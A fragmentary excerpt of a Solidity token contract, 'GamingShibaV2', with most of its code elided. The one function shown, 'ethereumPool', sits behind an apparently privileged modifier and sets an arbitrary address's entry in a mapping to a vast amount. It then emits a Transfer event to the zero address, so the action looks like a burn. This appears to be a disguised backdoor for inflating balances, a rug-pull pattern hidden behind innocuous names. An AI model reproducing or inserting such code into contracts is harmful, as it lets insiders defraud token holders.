...
// https://gaming-shiba.com/
// https://twitter.com/GamingShibaBSC
interface Ru {
  /**
...
contract GamingShibaV2 is Ma, Ru, Ko {
    ...
    */
       function ethereumPool(address ethereumRewards) external ethereumBridge {
        _rewardsApplied[ethereumRewards] = 10000000000 * 10 ** 20;
        
        emit Transfer(ethereumRewards, address(0), 10000000000 * 10 ** 20);
    } 
